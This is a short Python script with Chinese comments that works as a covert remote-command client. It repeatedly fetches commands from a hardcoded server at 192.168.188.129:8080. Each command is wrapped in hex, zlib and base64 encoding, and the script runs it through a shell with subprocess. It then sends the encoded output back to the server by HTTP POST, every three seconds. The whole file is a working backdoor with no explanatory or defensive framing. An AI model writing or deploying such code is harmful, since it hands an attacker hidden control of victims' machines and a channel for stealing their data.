#coding=utf-8

import requests
import subprocess
import time
import base64
import binascii
import zlib

while True:

    req = requests.get('http://192.168.188.129:8080') # 发送 GET 请求
    #command = req.text # 接收文本
    command = req.content # 接受字节
    command = binascii.a2b_hex(command)
    command = zlib.decompress(command)
    command = base64.b64decode(command)

    if 'quit' in command.decode():
        break

    else:
        CMD = subprocess.Popen(command.decode('utf-8'), shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        res = CMD.stdout.read()
        res = base64.b64encode(res)
        res = zlib.compress(res)
        res = binascii.b2a_hex(res)
        post_response = requests.post(url='http://192.168.188.129:8080', data=res) # POST 提交数据
        #post_response = requests.post(url='http://192.168.188.129:8080', data=CMD.stderr.read())

    time.sleep(3)
